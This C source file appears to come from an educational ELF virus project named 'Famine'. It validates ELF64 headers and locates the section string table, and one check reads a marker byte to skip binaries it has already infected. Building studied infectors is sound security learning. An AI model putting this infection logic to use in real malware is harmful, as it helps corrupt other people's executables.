/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   utils_elf64.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/07/28 15:58:26 by mabouce           #+#    #+#             */
/*   Updated: 2021/07/28 15:58:26 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void check_elf_header(t_famine *famine)
{
    if (famine->binary_data_size < sizeof(t_elf_ehdr))
    {
        error(ERROR_NOT_ELF, famine);
    }
    t_elf_ehdr *ehdr = (t_elf_ehdr *)famine->mmap_ptr;
    /*
    The first check we make to the Ehdr is whether it is an Elf64 file.
    This means that the first four bytes (e_ident[EI_MAG0..EI_MAG3])
    must equal 'ELF64_MAGIC' ("\x7FELF").
    For e_ident[EI_VERSION] we want EV_CURRENT.
    For e_ident[EI_OSABI] we want ELFOSABI_SYSV and
    for e_ident[EI_ABIVERSION] we want 0 (zero).
    */
    if (!(ehdr->e_ident[1] == ELFMAG1 &&
          ehdr->e_ident[2] == ELFMAG2 &&
          ehdr->e_ident[3] == ELFMAG3 &&
          ehdr->e_ident[EI_VERSION] == EV_CURRENT &&
          ehdr->e_ident[EI_OSABI] == ELFOSABI_SYSV &&
          ehdr->e_ident[EI_ABIVERSION] == 0 &&
          ehdr->e_ident[EI_PAD] == 0))
    {
        error(ERROR_NOT_ELF, famine);
    }
    // Checking if class is well define.
    if (ARCH_32 && ehdr->e_ident[EI_CLASS] != ELFCLASS32)
    {
        error(ERROR_NOT_ELF32, famine);
    }
    else if (ARCH_64 && ehdr->e_ident[EI_CLASS] != ELFCLASS64)
    {
        error(ERROR_NOT_ELF64, famine);
    }

    // Check if file have already been infected
    if (ehdr->e_ident[EI_PAD + 3] == 7)
    {
        error(ERROR_FILE_IS_ALREADY_INFECTED, famine);
    }
    /*e_ident[EI_DATA] to equal ELFDATA2LSB (little-endian data structures).*/
    if (!(ehdr->e_ident[EI_DATA] == ELFDATA2LSB))
    {
        error(ERROR_ELF_NOT_LITTLE_ENDIAN, famine);
    }
    /*Next check if the EIF type is an executable or a shared library e_type == ET_EXEC or ET_DYN.*/
    if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
    {
        error(ERROR_NOT_EXECUTABLE_BINARY, famine);
    }
}

void set_string_table_ptr(t_famine *famine)
{
    t_elf_shdr *sh_table;
    sh_table = famine->mmap_ptr + famine->ehdr->e_shoff;
    famine->string_table_ptr = famine->mmap_ptr + sh_table[famine->ehdr->e_shstrndx].sh_offset;
}
